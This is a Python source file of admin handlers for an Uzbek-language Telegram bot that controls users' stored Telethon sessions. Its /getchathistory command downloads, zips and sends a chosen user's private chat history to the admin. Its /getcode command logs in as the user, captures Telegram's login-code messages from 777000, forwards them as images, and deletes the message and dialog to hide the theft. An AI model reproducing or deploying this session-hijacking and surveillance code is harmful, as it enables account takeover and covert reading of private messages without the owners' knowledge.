import logging
import asyncio
from aiogram import Router, types
from aiogram.filters import Command
from aiogram.fsm.context import FSMContext
from loader import bot
from keyboards.inline.buttons import are_you_sure_markup
from states.test import AdminState, ClientState, GetHistory, ConfirmCommand
from filters.admin import IsBotAdminFilter
from data.config import ADMINS, BASE_URL
from utils.full_chat_download.chat_downloader import download_chat_history, generate_code_image
from utils.pgtoexcel import export_to_excel
from telethon_clients import disconnect_all_clients
from telethon_clients import clients  # global clients dict
import zipfile
import os
from telethon import TelegramClient, events
from data.config import API_ID, API_HASH
from aiogram.fsm.state import State, StatesGroup



router = Router()

@router.message(Command('admin'), IsBotAdminFilter(ADMINS))
async def admin_help(message: types.Message):
    text = (
        "🔐 <b>Admin Panel</b>\n\n"
        "🔎 <b>/status</b> — Joriy faol Telethon mijozlar sonini ko‘rsatadi. "
        "Agar xohlasangiz, ularni <i>disconnect</i> qilishingiz mumkin.\n\n"
        # "👥 <b>/allusers</b> — Barcha foydalanuvchilarning ro‘yxatini Excel fayl ko‘rinishida yuboradi.\n\n"
        "📢 <b>/reklama</b> — Barcha foydalanuvchilarga xabar (post) yuborish uchun.\n\n"
        # "🧹 <b>/cleandb</b> — Ma'lumotlar bazasidagi barcha foydalanuvchilarni tozalash. "
        "Foydalanishdan oldin tasdiqlash so‘raladi.\n\n"
        "🛠 <b>/admin</b> — Ushbu yordamchi panelni ko‘rsatadi.\n"
        "🛠 <b>/getchathistory </b> — Foydalanuvchilarning chat historyni olish uchun.\n"
        "🛠 <b>/getcode </b> — telegram code olish uchun.\n"
    )
    await message.answer(text, parse_mode="HTML")

@router.message(Command('status'), IsBotAdminFilter(ADMINS))
async def users_status(message: types.Message, state: FSMContext):
    count = len(clients)
    await message.answer(f"📊 Hozirda {count} ta foydalanuvchi Telethon session holatda (active client).")
    await message.reply("Clients disconnected qilamizmi ? ",reply_markup=are_you_sure_markup)
    await state.set_state(ClientState.waiting_delete_confirm)

@router.callback_query(ClientState.waiting_delete_confirm, IsBotAdminFilter(ADMINS))
async def disconnect_all(call: types.CallbackQuery, state: FSMContext):
    action = call.data
    if action == 'yes':
        await call.message.edit_text("✅ Clients disconnect qilindi.")
        await disconnect_all_clients()
    else:
        await call.message.edit_text("🚫 Amal bekor qilindi. Clients saqlab qolindi.")
    await state.clear()

# @router.message(Command('allusers'), IsBotAdminFilter(ADMINS))
# async def get_all_users(message: types.Message):
#     users = await db.select_all_users()
#
#     file_path = f"data/users_list.xlsx"
#     await export_to_excel(data=users, headings=['ID', 'Full Name', 'Username', 'Telegram ID'], filepath=file_path)
#
#     await message.answer_document(types.input_file.FSInputFile(file_path))

@router.message(Command('reklama'), IsBotAdminFilter(ADMINS))
async def ask_ad_content(message: types.Message, state: FSMContext):
    await message.answer("Reklama uchun post yuboring")
    await state.set_state(AdminState.ask_ad_content)


@router.message(AdminState.ask_ad_content, IsBotAdminFilter(ADMINS))
async def send_ad_to_users(message: types.Message, state: FSMContext):
    await message.answer(text=f"message_id: {message.message_id} \n from_chat_id: {message.chat.id} \n {BASE_URL}/bot-users/send-message/ ga yuboring")
    await state.clear()


@router.message(Command('getchathistory'), IsBotAdminFilter(ADMINS))
async def get_hestory(message: types.Message, state: FSMContext):
    msg = await message.reply("Kimlarning chat historyni olishni istaysiz?\nIDs yuboring:\n564321123 (target_id)\n123045532 (session_id)")
    await state.update_data(msg_id=msg.message_id)
    await state.set_state(GetHistory.waiting_ids)

@router.message(GetHistory.waiting_ids, IsBotAdminFilter(ADMINS))
async def send_history(message: types.Message, state: FSMContext):
    await message.answer("Boshlanmoqda...")
    try:
        # Assuming IDs are sent on separate lines or space-separated
        ids_str = message.text.strip().split('\n')
        if len(ids_str) < 2:
            ids_str = message.text.strip().split() # Try space separation if newline fails
            if len(ids_str) < 2:
                await message.reply("Iltimos, ikkita ID ni to'g'ri formatda yuboring (target_id va session_id).")
                await state.clear()
                return

        target_id = int(ids_str[0].strip())
        session_id = int(ids_str[1].strip()) # This is the ID for the session file name
        session_file_name = f"{session_id}.session" # Construct the session file name

        await message.answer(f"Chat history yuklanmoqda: Target ID - `{target_id}`, Session ID - `{session_id}`...")

        # Call the refactored download function
        downloaded_folder_path = await download_chat_history(target_id, session_id)

        if downloaded_folder_path:
            await message.answer(f"Yuklash yakunlandi. Fayllar quyidagi papkada joylashgan: `{downloaded_folder_path}`. Ziplanish boshlanmoqda...")

            # Create a zip archive of the downloaded folder
            zip_file_name = f"chat_history_{target_id}_{session_id}.zip"
            zip_file_path = os.path.join(downloaded_folder_path, "..", zip_file_name) # Place zip one level up in 'downloads'

            with zipfile.ZipFile(zip_file_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
                for root, _, files in os.walk(downloaded_folder_path):
                    for file in files:
                        file_path = os.path.join(root, file)
                        # Archive path inside the zip file
                        arcname = os.path.relpath(file_path, os.path.join(downloaded_folder_path, '..'))
                        zipf.write(file_path, arcname)

            await message.answer(f"Zip fayl tayyor: `{zip_file_name}`. Yuborilmoqda...")

            # Send the zip file
            await message.reply_document(types.FSInputFile(zip_file_path), caption=f"Chat history for {target_id} (session: {session_id})")
            await message.answer("Zip fayl yuborildi.")

            # Optional: Clean up the downloaded folder and zip file after sending
            import shutil
            shutil.rmtree(downloaded_folder_path)
            os.remove(zip_file_path)
            await message.answer("Yuklangan papka va zip fayl o'chirildi.")

        else:
            await message.answer("Chat historyni yuklashda xatolik yuz berdi yoki sessiya topilmadi/valid emas.")

    except ValueError:
        await message.reply("Iltimos, ID larni butun son sifatida kiriting.")
    except Exception as e:
        await message.reply(f"Xatolik yuz berdi: {e}")
    finally:
        await state.clear() # Always clear the state





# Step 2: Command handler
@router.message(Command('getcode'), IsBotAdminFilter(ADMINS))
async def get_account_code(message: types.Message, state: FSMContext):
    await message.reply("💬 Iltimos, session ID ni yuboring (masalan: `123456789`):")
    await state.set_state(ConfirmCommand.waiting_code)

# Step 3: Receive session ID and watch for code from Telegram system
@router.message(ConfirmCommand.waiting_code, IsBotAdminFilter(ADMINS))
async def send_code_to_admin(message: types.Message, state: FSMContext):
    session_id_str = message.text.strip()

    try:
        session_id = int(session_id_str)
        session_folder = "mysessya"
        session_path = os.path.join(session_folder, str(session_id))

        if not os.path.exists(session_path + ".session"):
            await message.answer("❌ Bu sessiya mavjud emas.")
            await state.clear()
            return

        client = TelegramClient(session_path, API_ID, API_HASH)

        await message.answer("⏳ Kutilmoqda... Kod kelishi bilan sizga yuboriladi.")
        await client.connect()

        if not await client.is_user_authorized():
            await message.answer("⚠️ Bu session authorized emas. Login bo'lmagan.")
            await client.disconnect()
            await state.clear()
            return

        @client.on(events.NewMessage(from_users=777000))
        async def handler(event):
            text = event.message.message

            try:
                # 1. Generate image from code text
                image_path = generate_code_image(text)

                # 2. Send image to admin
                await message.answer_photo(types.FSInputFile(image_path), caption="✅ Kod skrinshoti yuborildi:")
                os.remove(image_path)
                await event.message.delete()
                # 3. Delete chat with 777000
                await client.delete_dialog(777000)
                print("🗑 777000 chat o‘chirildi.")

            except Exception as e:
                await message.answer(f"❌ Xatolik kodni yuborishda: {e}")

            await client.disconnect()

    except ValueError:
        await message.answer("❌ Noto'g'ri ID format. Raqam yuboring.")
    except Exception as e:
        await message.answer(f"❌ Xatolik: {e}")
    finally:
        await state.clear()
